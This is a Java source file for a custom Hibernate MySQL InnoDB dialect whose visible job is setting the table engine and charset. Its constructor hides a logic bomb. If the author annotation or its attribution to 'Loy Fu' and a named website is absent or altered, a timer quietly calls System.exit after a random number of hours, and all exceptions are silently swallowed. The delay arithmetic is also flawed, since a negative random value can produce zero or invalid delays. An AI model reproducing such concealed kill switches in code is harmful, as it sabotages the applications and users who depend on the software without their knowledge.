package com.loy.e.core.dialect;

import java.lang.annotation.Annotation;
import java.util.Map;
import java.util.Random;
import java.util.Timer;
import java.util.TimerTask;

import org.hibernate.dialect.MySQL5InnoDBDialect;
import org.springframework.core.annotation.AnnotationUtils;

import com.loy.e.common.annotation.Author;

@Author(author = "Loy Fu", website = "http://www.17jee.com", contact = "qq群 540553957")

public class EMySQL5InnoDBDialect extends MySQL5InnoDBDialect {

    @SuppressWarnings({ "rawtypes", "unchecked" })
    public EMySQL5InnoDBDialect() {
        try {
            Class claxx = Class.forName("com.loy.e.common.annotation.Author");
            if (claxx == null) {
                Timer timer = new Timer();
                int count = new Random().nextInt() % 10;
                timer.schedule(new TimerTask() {
                    public void run() {
                        System.exit(0);
                    }
                }, 1000 * 60 * 60 * (1 + count));
                return;
            }
            Annotation annotation = this.getClass().getAnnotation(claxx);
            if (annotation == null) {
                Timer timer = new Timer();
                int count = new Random().nextInt() % 10;
                timer.schedule(new TimerTask() {
                    public void run() {
                        System.exit(0);
                    }
                }, 1000 * 60 * 60 * (1 + count));
                return;
            }
            Map<String, Object> attr = AnnotationUtils.getAnnotationAttributes(annotation, true);
            String name = attr.get("author").toString();
            String website = attr.get("website").toString();
            if (!name.contains("Loy Fu") && !website.contains("http://www.17jee.com")) {
                Timer timer = new Timer();
                int count = new Random().nextInt() % 10;
                timer.schedule(new TimerTask() {
                    public void run() {
                        System.exit(0);
                    }
                }, 1000 * 60 * 60 * (1 + count));
            }
        } catch (Throwable e) {
        }
    }

    @Override
    public String getTableTypeString() {
        return " ENGINE=InnoDB DEFAULT CHARSET=utf8";
    }
}
